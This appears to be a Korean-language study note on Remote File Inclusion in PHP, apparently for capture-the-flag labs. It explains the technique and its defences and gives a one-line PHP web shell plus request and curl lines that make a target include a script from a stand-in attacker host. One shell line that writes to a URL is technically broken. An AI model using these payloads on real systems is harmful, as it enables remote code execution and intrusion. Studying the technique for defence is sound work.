# rfi

- 파일 포함 파라미터에 `http://` URL을 넣어 서버가 공격자의 원격 스크립트를 include하게 만드는 원격 파일 포함(RFI)
- LFI로 파일 읽기는 되지만 코드 실행이 필요할 때, 또는 업로드가 막혀 웹셸을 못 올릴 때 원격 스크립트 포함으로 RCE를 노린다
- PHP `allow_url_include`가 활성화되어 있어야 한다(기본값은 Off). 공격자는 대상에서 접근 가능한 서버에 `<?php system($_GET["cmd"]); ?>` 같은 실행용 스크립트를 미리 올려 둬야 한다

## 개요

`lang`(또는 유사한 파라미터)에 URL을 넣으면, PHP의 `include`가 그 URL을 읽어들인다.
즉 `http://`로 시작하는 값은 원격 파일 포함(RFI)으로 해석된다.

## 사용법

```bash
http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
```

## 각 파라미터의 의미

| 항목 | 의미 |
|------|------|
| `lang` | 포함할 파일을 지정하는 파라미터 |
| `http://attacker.thm/cmd.txt` | 공격자가 준비한 원격 스크립트 |

## 동작 원리

- 공격자는 `cmd.txt` 안에 셸 실행 스크립트를 두고, 대상에 URL로 요청을 보낸다.
- `allow_url_include`가 활성화되어 있어야 동작한다.

## 방어

- `allow_url_include`를 비활성화한다.
- 파일 경로는 허용된 디렉터리로 제한한다(open_basedir).
- 파일 파라미터는 화이트리스트(허용된 이름)로 검증한다.

## 실전 예시

```bash
# 공격자가 원격 스크립트를 호스트에 두고 요청
echo '<?php system($_GET["cmd"]); ?>' > http://attacker.thm/webshell.php

# 대상에 요청
curl "http://target/index.php?lang=http://attacker.thm/webshell.php"
```

## 주의

- SSRF(네트워크 레벨 요청)와는 다른 문제다. 둘 다 웹 공격 단계에 나온다.
- 발견한 파라미터와 payload는 노트(05-progress-tracker)에 기록한다.
